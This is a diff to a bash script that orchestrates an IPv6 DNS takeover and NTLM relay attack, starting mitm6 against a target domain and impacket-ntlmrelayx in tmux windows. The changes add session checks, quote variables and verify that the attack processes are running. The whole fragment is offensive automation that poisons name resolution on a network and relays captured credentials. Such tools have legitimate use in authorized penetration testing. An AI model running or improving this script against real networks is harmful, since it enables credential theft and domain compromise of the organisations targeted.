@@ -154,9 +154,14 @@ cleanup() {
 trap cleanup EXIT
 
 # Create a new tmux session
-echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
 tmux has-session -t "$session_name" 2>/dev/null && {
-  echo -e "${RED}Session already exists (unexpected)${RESET}"
+  echo -e "${RED}Session already exists${RESET}"
+  exit 1
+}
+
+echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
+tmux new-session -d -s "$session_name" || {
+  echo -e "${RED}Failed to create tmux session${RESET}"
   exit 1
 }
 
@@ -176,14 +181,14 @@ start_tmux_window() {
 
 # Start mitm6 in tmux session
 echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
-start_tmux_window "$session_name" "mitm6" "mitm6 -i $interface -d $target_domain" || {
+start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" -d \"$target_domain\"" || {
   echo -e "${RED}Failed to start mitm6.${RESET}"
   exit 1
 }
 
 sleep 2
-tmux capture-pane -t "$session_name:mitm6" -p | grep -qi "mitm6" || {
-  echo -e "${RED}mitm6 may have failed to start${RESET}"
+tmux list-panes -t "$session_name:mitm6" -F "#{pane_pid}" | xargs -r ps -p >/dev/null || {
+  echo -e "${RED}mitm6 process not running${RESET}"
   exit 1
 }
 
@@ -195,8 +200,8 @@ start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 
 }
 
 sleep 2
-tmux capture-pane -t "$session_name:impacket-ntlmrelayx" -p | grep -qi "ntlmrelayx" || {
-  echo -e "${RED}ntlmrelayx may have failed to start${RESET}"
+tmux list-panes -t "$session_name:impacket-ntlmrelayx" -F "#{pane_pid}" | xargs -r ps -p >/dev/null || {
+  echo -e "${RED}ntlmrelayx process not running${RESET}"
   exit 1
 }
 
